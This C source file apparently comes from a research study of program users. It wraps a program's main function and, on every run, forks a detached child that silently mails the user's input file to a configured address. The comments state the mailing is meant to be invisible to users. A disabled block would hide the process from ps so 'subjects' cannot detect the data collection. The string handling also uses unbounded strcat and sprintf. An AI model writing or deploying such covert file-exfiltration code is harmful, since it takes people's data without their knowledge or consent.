/* driver-file.c: capture and mail input file, then invoke mymain */

#include <stdlib.h>
#include <stdio.h>
#include <assert.h>
#include <string.h>
#include <unistd.h>
#include <sys/fcntl.h>
#if 0
#include <sys/ioctl.h>
#endif
#include "driver.h"

/*
 * test scaffolding 
 *
 * includes a function to send mail on each run
 * and the real main function
 */

/* 
 * send_mail - send a notification via the mail_pgm
 * to the to_address.
 * accepts as argument a file name, which must exist
 * 
 * this function checks NO error conditions
 * based on the assumption that this notification
 * should be invisible to the user.
 * Fatal problems:
 *   - mail program does not exist/is not executable
 *   - target address is bogus
 * Problems, but not fatal:
 *   - the input file does not exist/is not readable
 */

void send_mail(mail_pgm, to_address, subject, in_file)
char *mail_pgm, *to_address, *subject, *in_file;
{
  int f;
  char *argv[5], *env[1];

  if (fork()) {  /* parent */
    return;
  }
  else {  /* child */

    for (f = 0; f < 3; f++)       /* detach from stdin, stdout, stderr */
      (void) close(f);
    f = open(in_file, O_RDONLY);                  /* attached as stdin  */
    if (f < 0)
      f = open("/dev/null", O_RDONLY);            /* guarantee a stdin */
    (void) open("/dev/null", O_WRONLY);           /* attached as stdout */
    (void) open("/dev/null", O_WRONLY|O_APPEND);  /* attached as stderr */

#if 0
    /* This ioctl() call results in the process releasing the tty completely.
     * I.e., ps will report "?" as the tty associated with the process.
     * Used here so that it would be very difficult for a subject to detect 
     * the data-collection process, but it was probably overkill.  This code 
     * only works as written on SunOS 4.1 (probably most BSD systems).
     */
    f = open("/dev/tty", O_RDWR);
    if (f > 0) {
      (void) ioctl(f, TIOCNOTTY, 0);
      (void) close(f);
    }
#endif

    /* sanity check on the subject */
    if (subject == (char *)0)
      subject = "SuBjEcT";

    /* set up the arguments and send the notification;
     * the mail program will read the message body from stdin
     */
    argv[0] = mail_pgm;
    argv[1] = "-s";
    argv[2] = subject;
    argv[3] = to_address;
    argv[4] = (char *)0;
    env[0]  = (char *)0;

    (void) execve(mail_pgm, argv, env);
  }
}

/*
 * capture_argv - store argument vector in a buffer
 */

void capture_argv(argc, argv, buf)
     int argc;
     char **argv;
     char *buf;
{
  int i;

  *buf = '\0';
  for (i = 1; i < argc; ++i) {
    strcat(buf, argv[i]);
    strcat(buf, " ");
  }
}

/*
 * main - the real main.
 * The ``main'' in the real program is renamed to ``mymain''
 * at compilation time, and that function is invoked from here.
 * NO error messages are generated here, it is silent
 */

int main(argc, argv)
     int argc;
     char **argv;
{
  extern int mymain();

  FILE *filep;
  char *file, msg[BUFSIZ];

  if (argc == 1) {
    /* problem: no input file */
    sprintf(msg, "%s %s (no args)", METHOD, *argv);
    send_mail(MAILER, TARGET, msg, "/dev/null");
  }
  else {
    file = argv[1];
    if ( (filep = fopen(file, "r")) == NULL) {
      /* problem: input file can't be opened/read */
      sprintf(msg, "%s %s (can't open file)", METHOD, *argv);
      send_mail(MAILER, TARGET, msg, "/dev/null");
    }
    else {
      /* no problem: send along the data file */
      fclose(filep);  /* only opened to check it */
      sprintf(msg, "%s %s %s", METHOD, *argv, file);
      send_mail(MAILER, TARGET, msg, file);
    }
  }
  return mymain(argc, argv);
}
